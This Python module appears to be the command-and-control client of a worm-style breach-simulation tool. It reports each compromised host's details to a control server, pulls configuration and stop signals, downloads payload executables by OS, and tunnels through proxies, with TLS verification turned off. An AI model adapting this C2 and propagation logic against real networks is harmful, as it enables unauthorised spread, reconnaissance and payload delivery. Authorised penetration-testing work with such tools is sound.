import json
import logging
import platform
from socket import gethostname

import requests

import monkeyfs
import tunnel
from config import WormConfiguration, GUID
from network.info import local_ips, check_internet_access
from transport.http import HTTPConnectProxy
from transport.tcp import TcpProxy

__author__ = 'hoffer'

requests.packages.urllib3.disable_warnings()

LOG = logging.getLogger(__name__)
DOWNLOAD_CHUNK = 1024


class ControlClient(object):
    proxies = {}

    @staticmethod
    def wakeup(parent=None, default_tunnel=None, has_internet_access=None):
        LOG.debug("Trying to wake up with Monkey Island servers list: %r" % WormConfiguration.command_servers)
        if parent or default_tunnel:
            LOG.debug("parent: %s, default_tunnel: %s" % (parent, default_tunnel))
        hostname = gethostname()
        if not parent:
            parent = GUID

        if has_internet_access is None:
            has_internet_access = check_internet_access(WormConfiguration.internet_services)

        for server in WormConfiguration.command_servers:
            try:
                WormConfiguration.current_server = server

                monkey = {'guid': GUID,
                          'hostname': hostname,
                          'ip_addresses': local_ips(),
                          'description': " ".join(platform.uname()),
                          'internet_access': has_internet_access,
                          'config': WormConfiguration.as_dict(),
                          'parent': parent}

                if ControlClient.proxies:
                    monkey['tunnel'] = ControlClient.proxies.get('https')

                debug_message = "Trying to connect to server: %s" % server
                if ControlClient.proxies:
                    debug_message += " through proxies: %s" % ControlClient.proxies
                LOG.debug(debug_message)
                reply = requests.post("https://%s/api/monkey" % (server,),
                                      data=json.dumps(monkey),
                                      headers={'content-type': 'application/json'},
                                      verify=False,
                                      proxies=ControlClient.proxies,
                                      timeout=20)
                break

            except Exception as exc:
                WormConfiguration.current_server = ""
                LOG.warn("Error connecting to control server %s: %s", server, exc)

        if not WormConfiguration.current_server:
            if not ControlClient.proxies:
                LOG.info("Starting tunnel lookup...")
                proxy_find = tunnel.find_tunnel(default=default_tunnel)
                if proxy_find:
                    proxy_address, proxy_port = proxy_find
                    LOG.info("Found tunnel at %s:%s" % (proxy_address, proxy_port))
                    ControlClient.proxies['https'] = 'https://%s:%s' % (proxy_address, proxy_port)
                    ControlClient.wakeup(parent=parent, has_internet_access=has_internet_access)
                else:
                    LOG.info("No tunnel found")

    @staticmethod
    def keepalive():
        if not WormConfiguration.current_server:
            return
        try:
            monkey = {}
            if ControlClient.proxies:
                monkey['tunnel'] = ControlClient.proxies.get('https')
            reply = requests.patch("https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID),
                                   data=json.dumps(monkey),
                                   headers={'content-type': 'application/json'},
                                   verify=False,
                                   proxies=ControlClient.proxies)
        except Exception as exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)
            return {}

    @staticmethod
    def send_telemetry(telem_type, data):
        if not WormConfiguration.current_server:
            return
        try:
            telemetry = {'monkey_guid': GUID, 'telem_type': telem_type, 'data': data}
            reply = requests.post("https://%s/api/telemetry" % (WormConfiguration.current_server,),
                                  data=json.dumps(telemetry),
                                  headers={'content-type': 'application/json'},
                                  verify=False,
                                  proxies=ControlClient.proxies)
        except Exception as exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)

    @staticmethod
    def load_control_config():
        if not WormConfiguration.current_server:
            return
        try:
            reply = requests.get("https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID),
                                 verify=False,
                                 proxies=ControlClient.proxies)

        except Exception as exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)
            return

        try:
            unknown_variables = WormConfiguration.from_dict(reply.json().get('config'))
            LOG.info("New configuration was loaded from server: %r" % (WormConfiguration.as_dict(),))
        except Exception as exc:
            # we don't continue with default conf here because it might be dangerous
            LOG.error("Error parsing JSON reply from control server %s (%s): %s",
                      WormConfiguration.current_server, reply._content, exc)
            raise Exception("Couldn't load from from server's configuration, aborting. %s" % exc)

        if unknown_variables:
            ControlClient.send_config_error()

    @staticmethod
    def send_config_error():
        if not WormConfiguration.current_server:
            return
        try:
            requests.patch("https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID),
                           data=json.dumps({'config_error': True}),
                           headers={'content-type': 'application/json'},
                           verify=False,
                           proxies=ControlClient.proxies)
        except Exception as exc:
            LOG.warn("Error connecting to control server %s: %s", WormConfiguration.current_server, exc)
            return {}

    @staticmethod
    def check_for_stop():
        ControlClient.load_control_config()
        return not WormConfiguration.alive

    @staticmethod
    def download_monkey_exe(host):
        filename, size = ControlClient.get_monkey_exe_filename_and_size_by_host(host)
        if filename is None:
            return None
        return ControlClient.download_monkey_exe_by_filename(filename, size)

    @staticmethod
    def download_monkey_exe_by_os(is_windows, is_32bit):
        filename, size = ControlClient.get_monkey_exe_filename_and_size_by_host_dict(
            ControlClient.spoof_host_os_info(is_windows, is_32bit))
        if filename is None:
            return None
        return ControlClient.download_monkey_exe_by_filename(filename, size)

    @staticmethod
    def spoof_host_os_info(is_windows, is_32bit):
        if is_windows:
            os = "windows"
            if is_32bit:
                arch = "x86"
            else:
                arch = "amd64"
        else:
            os = "linux"
            if is_32bit:
                arch = "i686"
            else:
                arch = "x86_64"

        return \
            {
                "os":
                    {
                        "type": os,
                        "machine": arch
                    }
            }

    @staticmethod
    def download_monkey_exe_by_filename(filename, size):
        if not WormConfiguration.current_server:
            return None
        try:
            dest_file = monkeyfs.virtual_path(filename)
            if (monkeyfs.isfile(dest_file)) and (size == monkeyfs.getsize(dest_file)):
                return dest_file
            else:
                download = requests.get("https://%s/api/monkey/download/%s" %
                                        (WormConfiguration.current_server, filename),
                                        verify=False,
                                        proxies=ControlClient.proxies)

                with monkeyfs.open(dest_file, 'wb') as file_obj:
                    for chunk in download.iter_content(chunk_size=DOWNLOAD_CHUNK):
                        if chunk:
                            file_obj.write(chunk)
                    file_obj.flush()
                if size == monkeyfs.getsize(dest_file):
                    return dest_file

        except Exception as exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)

    @staticmethod
    def get_monkey_exe_filename_and_size_by_host(host):
        return ControlClient.get_monkey_exe_filename_and_size_by_host_dict(host.as_dict())

    @staticmethod
    def get_monkey_exe_filename_and_size_by_host_dict(host_dict):
        if not WormConfiguration.current_server:
            return None, None
        try:
            reply = requests.post("https://%s/api/monkey/download" % (WormConfiguration.current_server,),
                                  data=json.dumps(host_dict),
                                  headers={'content-type': 'application/json'},
                                  verify=False, proxies=ControlClient.proxies)

            if 200 == reply.status_code:
                result_json = reply.json()
                filename = result_json.get('filename')
                if not filename:
                    return None, None
                size = result_json.get('size')
                return filename, size
            else:
                return None, None

        except Exception as exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)

        return None, None

    @staticmethod
    def create_control_tunnel():
        if not WormConfiguration.current_server:
            return None

        my_proxy = ControlClient.proxies.get('https', '').replace('https://', '')
        if my_proxy:
            proxy_class = TcpProxy
            try:
                target_addr, target_port = my_proxy.split(':', 1)
                target_port = int(target_port)
            except:
                return None
        else:
            proxy_class = HTTPConnectProxy
            target_addr, target_port = None, None

        return tunnel.MonkeyTunnel(proxy_class, target_addr=target_addr, target_port=target_port)
